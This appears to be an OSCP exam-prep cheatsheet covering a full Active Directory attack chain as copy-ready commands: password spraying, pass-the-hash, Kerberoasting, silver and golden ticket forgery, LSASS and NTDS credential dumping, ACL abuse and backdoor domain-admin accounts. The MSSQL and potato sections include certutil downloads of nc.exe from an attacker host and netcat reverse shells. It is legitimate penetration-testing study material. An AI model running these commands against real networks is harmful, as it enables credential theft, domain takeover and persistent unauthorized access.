# 🏰 Active Directory Attack Cheatsheet — OSCP Reference

> **Quick Reference for Penetration Testing & OSCP Exam**  
> Covers the full AD attack chain from initial access to domain compromise.

---

## 📋 Table of Contents
- [Initial Enumeration](#-initial-enumeration)
- [BloodHound](#-bloodhound)
- [Credential Attacks](#-credential-attacks)
- [Lateral Movement](#-lateral-movement)
- [MSSQL Attacks](#-mssql-attacks)
- [Kerberos Attacks](#-kerberos-attacks)
- [Silver Ticket Attack](#-silver-ticket-attack)
- [Golden Ticket Attack](#-golden-ticket-attack)
- [Credential Dumping](#-credential-dumping)
- [Privilege Escalation](#-privilege-escalation)
- [Domain Compromise](#-domain-compromise)
- [Persistence](#-persistence)
- [Quick Decision Guide](#-quick-decision-guide)
- [AD Attack Chain](#-ad-attack-chain)

---

## 🔍 Initial Enumeration

### Host Discovery
```bash
# Find live hosts
fping -a -g 192.168.1.0/24 2>/dev/null

# Identify DCs (look for LDAP/Kerberos)
nmap -p 88,389,445,636,3268 192.168.1.0/24

# Full port scan on targets
nmap -sV -sC -p- <ip> --min-rate 2000
```

### SMB Enumeration
```bash
# Null session
nxc smb 192.168.1.0/24 -u '' -p ''

# Guest session
nxc smb 192.168.1.0/24 -u guest -p ''

# With creds — sweep subnet
nxc smb 192.168.1.0/24 -u user -p password

# Enumerate users
nxc smb <dc_ip> -u user -p password --users

# Enumerate groups
nxc smb <dc_ip> -u user -p password --groups

# Enumerate shares
nxc smb <ip> -u user -p password --shares

# Password policy (check before spraying)
nxc smb <dc_ip> -u user -p password --pass-pol

# Logged on users
nxc smb <ip> -u user -p password --loggedon-users

# Sessions
nxc smb <ip> -u user -p password --sessions
```

### LDAP Enumeration
```bash
# Basic LDAP enum
nxc ldap <dc_ip> -u user -p password

# Get domain computers
nxc ldap <dc_ip> -u user -p password --computers

# Dump via ldapdomaindump
impacket-ldapdomaindump <domain>/user:password -n <dc_ip> -o /tmp/ldap_dump

# Anonymous LDAP bind
ldapsearch -x -H ldap://<dc_ip> -b "dc=domain,dc=local"
```

### RPC Enumeration
```bash
# Connect
rpcclient -U "domain/user%password" <ip>

# Inside rpcclient
enumdomusers          # list all domain users
enumdomgroups         # list all domain groups
querydominfo          # domain info
netshareenum          # list shares
lsaquery              # get domain SID
```

---

## 🩸 BloodHound

### Collection
```bash
# Full collection (recommended)
bloodhound-python -u user -p password -d domain.local -ns <dc_ip> -c all --zip

# Collection methods
-c All          # everything
-c DCOnly       # DC only (faster, less noisy)
-c Session      # sessions only

# Start BloodHound
sudo bloodhound-start
```

### Key Queries to Run
```
✅ Shortest Paths from Owned Principals
✅ Find Computers where Domain Users are Local Admin
✅ Shortest Paths to Domain Admins
✅ Find AS-REP Roastable Users
✅ Find Kerberoastable Users
✅ Shortest Paths to Unconstrained Delegation Systems
✅ Find Principals with DCSync Rights
```

### What to Check Per Node
```
User node:
  → Outbound Object Control (ACL rights over other objects)
  → Member Of (group memberships)
  → Reachable High Value Targets

Computer node:
  → Local Admins (who has admin here)
  → Sessions (who is logged in)
  → Outbound Object Control
  → Inbound Object Control (who has rights over this machine)
```

---

## 🔑 Credential Attacks

### Password Spraying
```bash
# CAUTION — check password policy first to avoid lockouts
nxc smb <dc_ip> -u user -p password --pass-pol

# Spray single password against all users
nxc smb <dc_ip> -u users.txt -p 'Password123' --continue-on-success

# Spray across subnet
nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'
```

### GPP Passwords (Classic Goldmine)
```bash
# Check Group Policy Preferences for stored passwords
nxc smb <dc_ip> -u user -p password -M gpp_password
nxc smb <dc_ip> -u user -p password -M gpp_autologin

# Manual check
nxc smb <dc_ip> -u user -p password --shares
# Look for SYSVOL share → check for Groups.xml files
```

### LAPS
```bash
# Read LAPS passwords (if user has read rights)
nxc ldap <dc_ip> -u user -p password -M laps

# Via BloodHound — check "ReadLAPSPassword" edges
```

### Autologon Credentials
```bash
nxc smb <ip> -u user -p password -M autologon

# Manual registry check (on Windows shell)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

---

## 🔄 Lateral Movement

### Pass the Hash
```bash
# Test hash across subnet
nxc smb 192.168.1.0/24 -u administrator -H NTLM_HASH

# Get shell with hash
impacket-psexec <domain>/administrator@<ip> -hashes :NTLM_HASH
impacket-wmiexec <domain>/administrator@<ip> -hashes :NTLM_HASH
impacket-smbexec <domain>/administrator@<ip> -hashes :NTLM_HASH

# Evil-WinRM with hash
evil-winrm -i <ip> -u administrator -H NTLM_HASH
```

### Pass the Ticket
```bash
# Export ticket
export KRB5CCNAME=/path/to/ticket.ccache

# Verify ticket
klist

# Use ticket
nxc smb <ip> --use-kcache
impacket-psexec -k -no-pass <domain>/user@target.domain
impacket-wmiexec -k -no-pass <domain>/user@target.domain
```

### Machine Account Attacks
```bash
# Dump machine account hash
impacket-secretsdump <domain>/admin:<pass>@<ip> | grep '\$'

# Try machine account against other hosts
nxc smb <target_ip> -u 'MACHINE1$' -H <ntlm_hash> -d <domain>
impacket-psexec <domain>/'MACHINE1$'@<target_ip> -hashes :<ntlm_hash>
```

### WinRM / Evil-WinRM
```bash
# Connect
evil-winrm -i <ip> -u user -p password

# With hash
evil-winrm -i <ip> -u user -H NTLM_HASH

# Upload file
upload /kali/path/file.exe C:\Windows\Temp\file.exe

# Download file
download C:\Windows\Temp\file.txt /kali/path/
```

---

## 🗄️ MSSQL Attacks

### Authentication
```bash
# Windows auth
impacket-mssqlclient <domain>/user:password@<ip> -windows-auth

# SQL auth
impacket-mssqlclient user:password@<ip>

# With hash
impacket-mssqlclient <domain>/user@<ip> -hashes :NTLM_HASH -windows-auth

# NXC check
nxc mssql <ip> -u user -p password -d <domain>
```

### Privilege Escalation Inside MSSQL
```sql
-- Check role
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Check impersonation (most common privesc path)
SELECT distinct b.name FROM sys.database_permissions a
JOIN sys.database_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate sa or sysadmin user
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');

-- Check linked servers
SELECT name,provider,data_source FROM sys.servers WHERE is_linked = 1;

-- Execute on linked server
SELECT * FROM OPENQUERY(<linked_server>, 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY(<linked_server>, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');
```

### RCE via xp_cmdshell
```sql
-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;

-- Execute commands
EXEC xp_cmdshell('whoami');

-- Download nc.exe
EXEC xp_cmdshell('certutil -urlcache -f http://<kali_ip>/nc.exe C:\Windows\Temp\nc.exe');

-- Reverse shell
EXEC xp_cmdshell('C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe');

-- Avoid quote issues with DECLARE
DECLARE @c varchar(500);
SET @c='cmd /c whoami > C:\Windows\Temp\out.txt';
EXEC xp_cmdshell(@c);
```

### UNC Path Hash Capture
```bash
# Start Responder on Kali
sudo responder -I tun0 -wrf

# Trigger from MSSQL
EXEC xp_dirtree '\\<kali_ip>\share';
EXEC xp_fileexist '\\<kali_ip>\share\file';
```

---

## 🎫 Kerberos Attacks

### ASREPRoasting
```bash
# With creds
nxc ldap <dc_ip> -u user -p password --asreproast asrep.txt
impacket-GetNPUsers <domain>/user:password -dc-ip <dc_ip> -request -outputfile asrep.txt

# Without creds (needs username list)
impacket-GetNPUsers <domain>/ -usersfile users.txt -no-pass -dc-ip <dc_ip>

# Crack
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Kerberoasting
```bash
# With creds
nxc ldap <dc_ip> -u user -p password --kerberoasting kerb.txt
impacket-GetUserSPNs <domain>/user:password -dc-ip <dc_ip> -request -outputfile kerb.txt

# With hash
impacket-GetUserSPNs <domain>/user -hashes :NTLM_HASH -dc-ip <dc_ip> -request

# Crack
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### Delegation Attacks
```bash
# Find delegation
impacket-findDelegation <domain>/user:password -dc-ip <dc_ip>
nxc ldap <dc_ip> -u user -p password --trusted-for-delegation

# Constrained Delegation — S4U2Proxy
impacket-getST <domain>/user:password \
  -spn cifs/<target_hostname> \
  -impersonate administrator \
  -dc-ip <dc_ip>

export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <domain>/administrator@<target_hostname>

# Unconstrained Delegation
# Get TGT from machine with unconstrained delegation
# Use printer bug to force DC to authenticate
impacket-printerbug <domain>/user:password@<unconstrained_host> <kali_ip>
```

---

## 🥈 Silver Ticket Attack

> Forge a service ticket using a service account's NTLM hash. No DC communication needed.

```bash
# Step 1 — Generate NTLM hash from password
python3 -c "import hashlib; print(hashlib.new('md4', '<password>'.encode('utf-16-le')).hexdigest())"

# Step 2 — Get Domain SID
rpcclient -U "<domain>/user%password" <dc_ip> -c "lsaquery"
impacket-getPac <domain>/user:password -targetUser user -dc-ip <dc_ip>
nxc smb <dc_ip> -u user -p password --get-sid

# Step 3 — Get target hostname
nxc smb <target_ip> -u user -p password
# Hostname shown in banner

# Step 4 — Create Silver Ticket
impacket-ticketer \
  -nthash <service_account_ntlm_hash> \
  -domain-sid <domain_sid> \
  -domain <domain> \
  -spn MSSQLSvc/<target_hostname>:1433 \
  administrator

# Step 5 — Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k -no-pass <domain>/administrator@<target_hostname> -windows-auth

# Common SPNs for silver tickets
# MSSQL:  MSSQLSvc/<hostname>:1433
# SMB:    cifs/<hostname>
# HTTP:   HTTP/<hostname>
# WinRM:  HTTP/<hostname>:5985
```

### krb5.conf Setup (Required for Kerberos)
```bash
sudo nano /etc/krb5.conf
```
```ini
[libdefaults]
    default_realm = DOMAIN.LOCAL
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    DOMAIN.LOCAL = {
        kdc = <dc_ip>
        admin_server = <dc_ip>
    }

[domain_realm]
    .domain.local = DOMAIN.LOCAL
    domain.local = DOMAIN.LOCAL
```

```bash
# Add hostname to /etc/hosts
echo "<target_ip> <hostname>.<domain>" | sudo tee -a /etc/hosts
```

---

## 🥇 Golden Ticket Attack

> Forge a TGT using the krbtgt hash. Full domain persistence.

```bash
# Step 1 — Get krbtgt hash (need DA or DCSync rights)
impacket-secretsdump <domain>/administrator:password@<dc_ip> -just-dc-user krbtgt

# Step 2 — Get Domain SID
impacket-secretsdump <domain>/administrator:password@<dc_ip> -just-dc | grep "Domain SID"

# Step 3 — Create Golden Ticket
impacket-ticketer \
  -nthash <krbtgt_ntlm_hash> \
  -domain-sid <domain_sid> \
  -domain <domain> \
  administrator

# Step 4 — Use the ticket
export KRB5CCNAME=administrator.ccache
impacket-psexec -k -no-pass <domain>/administrator@<dc_hostname>
impacket-wmiexec -k -no-pass <domain>/administrator@<dc_hostname>
impacket-smbclient -k -no-pass <domain>/administrator@<dc_hostname>
```

---

## 🗝️ Credential Dumping

### Remote Dumping
```bash
# SAM (local hashes)
nxc smb <ip> -u admin -p pass --sam
impacket-secretsdump <domain>/admin:pass@<ip>

# LSA secrets (service accounts, cached creds)
nxc smb <ip> -u admin -p pass --lsa

# LSASS (logged in users, cleartext)
nxc smb <ip> -u admin -p pass -M lsassy
nxc smb <ip> -u admin -p pass -M nanodump

# NTDS (ALL domain hashes — DC only)
nxc smb <dc_ip> -u admin -p pass --ntds
impacket-secretsdump <domain>/admin:pass@<dc_ip> -just-dc

# DCSync (specific user)
impacket-secretsdump <domain>/admin:pass@<dc_ip> -just-dc-user administrator
impacket-secretsdump <domain>/admin:pass@<dc_ip> -just-dc-user krbtgt
```

### Local File Dumping
```bash
# Save registry hives on Windows
reg save HKLM\SAM C:\Windows\Temp\SAM
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY

# Download to Kali then dump offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local

# Parse LSASS dump offline
pypykatz lsa minidump lsass.dmp
```

---

## 📈 Privilege Escalation

### Windows Token Privileges
```powershell
# Check privileges
whoami /priv
whoami /all
```

| Privilege | Attack |
|-----------|--------|
| `SeImpersonatePrivilege` | GodPotato / PrintSpoofer / SweetPotato |
| `SeBackupPrivilege` | Read SAM/NTDS/shadow copies |
| `SeDebugPrivilege` | Dump LSASS |
| `SeLoadDriverPrivilege` | Load malicious driver |
| `SeTakeOwnershipPrivilege` | Take ownership of any file |
| `SeRestorePrivilege` | Write any file |

### Potato Attacks (SeImpersonatePrivilege)
```powershell
# GodPotato (most reliable — Windows 10/Server 2019+)
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "cmd /c C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"

# PrintSpoofer (Windows 10/Server 2019)
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe <kali_ip> 9001 -e cmd.exe"

# SweetPotato
.\SweetPotato.exe -e EfsRpc -p C:\Windows\Temp\nc.exe -a "<kali_ip> 9001 -e cmd"
```

### ACL Abuse
```bash
# GenericAll on user — force change password
net rpc password <target_user> <new_pass> -U <domain>/<user>%<pass> -S <dc_ip>

# GenericAll on group — add yourself
net rpc group addmem "<group>" <your_user> -U <domain>/<user>%<pass> -S <dc_ip>

# WriteDACL — give yourself DCSync
impacket-dacledit <domain>/<user>:<pass> -action write -rights DCSync -target <domain> -dc-ip <dc_ip>

# ForceChangePassword
impacket-changepasswd <domain>/<target_user>@<dc_ip> -newpass <new_pass> -altuser <domain>/<user> -altpass <pass>
```

---

## 👑 Domain Compromise

### DCSync
```bash
# Dump all hashes
impacket-secretsdump <domain>/administrator:pass@<dc_ip> -just-dc

# Dump specific users
impacket-secretsdump <domain>/administrator:pass@<dc_ip> -just-dc-user administrator
impacket-secretsdump <domain>/administrator:pass@<dc_ip> -just-dc-user krbtgt
```

### NTDS Dump
```bash
# Via nxc
nxc smb <dc_ip> -u administrator -p pass --ntds

# Via VSS (Volume Shadow Copy)
nxc smb <dc_ip> -u administrator -p pass --ntds --ntds-history
```

### Pass DA Hash
```bash
# Get shell on DC
impacket-psexec <domain>/administrator@<dc_ip> -hashes :NTLM_HASH
evil-winrm -i <dc_ip> -u administrator -H NTLM_HASH
```

---

## 🔒 Persistence

### Add Domain Admin
```cmd
net user backdoor Password123! /add /domain
net group "Domain Admins" backdoor /add /domain
```

### Golden Ticket (Unlimited Persistence)
```bash
# Get krbtgt hash then create golden ticket
# Valid for 10 years by default
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> administrator
```

### Add Local Admin
```cmd
net user backdoor Password123! /add
net localgroup Administrators backdoor /add
```

---

## 🗺️ Quick Decision Guide

| Situation | Action |
|-----------|--------|
| No creds, starting recon | `nxc smb <subnet> -u '' -p ''` + BloodHound |
| Have low priv creds | BloodHound collection + Kerberoast + ASREPRoast |
| Have admin on machine | `--sam` + `--lsa` + `-M lsassy` + `--loggedon-users` |
| Got NTLM hashes | PTH across subnet → find Pwn3d |
| Got Kerberoastable user | Crack hash → test new creds everywhere |
| Service account cracked | Check delegation + Silver Ticket + BloodHound edges |
| MSSQL access but not sysadmin | Check impersonation → linked servers → UNC hash capture |
| MSSQL auth fails but SMB works | Silver Ticket for MSSQLSvc SPN |
| Have DA or SYSTEM on DC | DCSync → dump NTDS → Golden Ticket |
| No BloodHound edges | Check GPP → LAPS → shares → machine account PTH |
| SeImpersonatePrivilege | GodPotato or PrintSpoofer → SYSTEM |
| GenericAll on user | ForceChangePassword |
| GenericAll on group | Add yourself to group |
| WriteDACL on domain | Give yourself DCSync rights |

---

## ⛓️ AD Attack Chain

```
1. RECON
   └── nmap + fping → find hosts
   └── nxc smb sweep → null/guest session
   └── enum users/shares/policies

2. INITIAL ACCESS
   └── Password spray (check policy first)
   └── ASREPRoast (no creds needed)
   └── GPP passwords in SYSVOL
   └── Anonymous LDAP/SMB

3. ENUMERATION WITH CREDS
   └── BloodHound collection
   └── Kerberoasting
   └── LAPS/GPP/Autologon checks
   └── Share spidering

4. LATERAL MOVEMENT
   └── Pass-the-Hash
   └── Pass-the-Ticket
   └── WinRM/PSExec/WMIExec
   └── Machine account PTH

5. PRIVILEGE ESCALATION
   └── Token privilege abuse (Potato attacks)
   └── ACL abuse (GenericAll/WriteDACL)
   └── Delegation attacks
   └── Silver/Golden tickets

6. DOMAIN COMPROMISE
   └── DCSync → dump all hashes
   └── NTDS dump
   └── Golden Ticket → persistence
   └── New DA account → persistence
```

---

## ⚠️ OSCP Exam Notes

| Tool | Allowed? |
|------|---------|
| BloodHound | ✅ Yes |
| NetExec / nxc | ✅ Yes |
| Impacket suite | ✅ Yes |
| Evil-WinRM | ✅ Yes |
| Rubeus | ✅ Yes |
| Mimikatz | ✅ Yes |
| Metasploit (1 machine) | ⚠️ Limited |
| sqlmap | ❌ No |

> 📖 Always verify with the official [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)

---

## 💡 Pro Tips

- **Always check `--lsa` AND `-M lsassy`** — SAM only gives local hashes, LSA gives cached domain creds
- **BloodHound before everything** — don't waste time guessing attack paths
- **Mark nodes as owned** in BloodHound as you go — shortest path queries get better
- **Machine accounts (`MACHINE$`)** often have local admin on other machines — always try PTH with them
- **Service accounts** are goldmines — check delegation, Silver Ticket, and impersonation
- **Kerberoast immediately** once you have any domain creds — service account hashes crack fast
- **MSSQL auth fails but SMB works** → Silver Ticket is almost always the path
- **No BloodHound edges** → check GPP, LAPS, shares, and machine account PTH before giving up
- **SeImpersonatePrivilege** on any Windows box → instant SYSTEM via GodPotato
- **Always save all hashes** — a hash useless now might be the key to the next machine

---

*Generated for OSCP PEN-200 exam preparation*
